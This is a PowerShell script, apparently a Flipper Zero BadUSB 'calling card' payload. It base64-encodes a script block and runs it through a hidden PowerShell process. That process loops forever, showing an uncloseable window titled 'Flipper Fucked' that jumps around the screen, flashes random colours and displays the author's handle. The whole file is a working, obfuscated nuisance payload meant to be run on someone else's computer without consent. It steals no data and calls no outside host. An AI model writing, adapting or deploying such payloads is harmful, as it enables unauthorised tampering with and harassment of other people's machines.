##################################################################################################################################################################
##################################################################################################################################################################
<#
                 _..--+~/@-~--.
             _-=~      (  .   "}
          _-~     _.--=.\ \""""
        _~      _-       \ \_\
       =      _=          '--'
      '      =                             .
     :      :       ____                   '=_. ___
___  |      ;                            ____ '~--.~.
     ;      ;                               _____  } |
  ___=       \ ___ __     __..-...__           ___/__/__
     :        =_     _.-~~          ~~--.__
_____ \         ~-+-~                   ___~=_______
     ~@#~~ == ...______ __ ___ _--~~--_
                                                    =
██████╗ ███████╗ █████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗███████╗ ██████╗ ██╗ ██████╗ █████╗ 
██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝╚══███╔╝██╔════╝███║██╔════╝██╔══██╗
██████╔╝███████╗███████║██╔██╗ ██║██║     ███████║█████╗    ███╔╝ ██║     ╚██║███████╗╚██████║
██╔══██╗╚════██║██╔══██║██║╚██╗██║██║     ██╔══██║██╔══╝   ███╔╝  ██║      ██║██╔═══██╗╚═══██║
██║  ██║███████║██║  ██║██║ ╚████║╚██████╗██║  ██║███████╗███████╗╚██████╗ ██║╚██████╔╝█████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚════╝ 
Script Version: 1
OS Version Script was written on: Microsoft Windows 11 Pro : 10.0.25100 Build 26100
PSVersion 5.1.26100.2161 : PSEdition Desktop : Build Version 10.0.26100.2161
Flipper Zero FirmWare mntm-001 https://momentum-fw.dev/update/
Description of Script: Sometimes you just want to leave a calling card behind.
#>
##################################################################################################################################################################
#==============================Beginning==========================================================================================================================
##################################################################################################################################################################
# Define the script block
$scriptBlock = {
    # Load the necessary assemblies
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Infinite loop to keep the form running
    while ($true) {
        # Create a new bitmap object
        $bitmap = New-Object System.Drawing.Bitmap 400, 100

        # Create graphics object from bitmap
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)

        # Define the font to draw with
        $font = New-Object System.Drawing.Font("Arial", 20)

        # Random number generator
        $rand = New-Object System.Random

        # Create a form to display the image
        $form = New-Object Windows.Forms.Form
        $form.Text = "Flipper Fucked"
        $form.Width = 415
        $form.Height = 140
        $form.StartPosition = 'CenterScreen'
        $form.ControlBox = $false # Remove the control box

        # Create a picture box to display the image
        $pictureBox = New-Object Windows.Forms.PictureBox
        $pictureBox.Width = 400
        $pictureBox.Height = 100
        $pictureBox.Dock = 'Fill'

        # Add the picture box to the form
        $form.Controls.Add($pictureBox)

        # Timer to change position and color
        $timer = New-Object Windows.Forms.Timer
        $timer.Interval = 1000 # Change every second

        # Event to change form properties
        $timer.Add_Tick({
            # Randomly change the location of the form
            $form.Left = $rand.Next(0, [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - $form.Width)
            $form.Top = $rand.Next(0, [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height - $form.Height)

            # Randomly change the background color of the form
            $form.BackColor = [System.Drawing.Color]::FromArgb($rand.Next(256), $rand.Next(256), $rand.Next(256))

            # Clear the previous drawing with the new background color
            $graphics.Clear($form.BackColor)

            # Draw the text 'rsanchezc169' in a random color
            $drawingColor = [System.Drawing.Color]::FromArgb($rand.Next(256), $rand.Next(256), $rand.Next(256))
            $brush = New-Object System.Drawing.SolidBrush($drawingColor)
            $graphics.DrawString("rsanchezc169", $font, $brush, 10, 40)

            # Update the image of the picture box
            $pictureBox.Image = $bitmap

            # Dispose of the brush to free up resources
            $brush.Dispose()
        })

        # Start the timer
        $timer.Start()

        # Show the form
        $form.ShowDialog()

        # Dispose of graphics, bitmap, and timer objects to free up resources
        $graphics.Dispose()
        $bitmap.Dispose()
        $timer.Dispose()
    }
}

# Convert the script block to a Base64-encoded string
$encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock))

# Start the PowerShell process with a hidden window
Start-Process "powershell.exe" -ArgumentList "-WindowStyle Hidden -EncodedCommand $encodedScript" -NoNewWindow
##################################################################################################################################################################
#==============================End================================================================================================================================
##################################################################################################################################################################
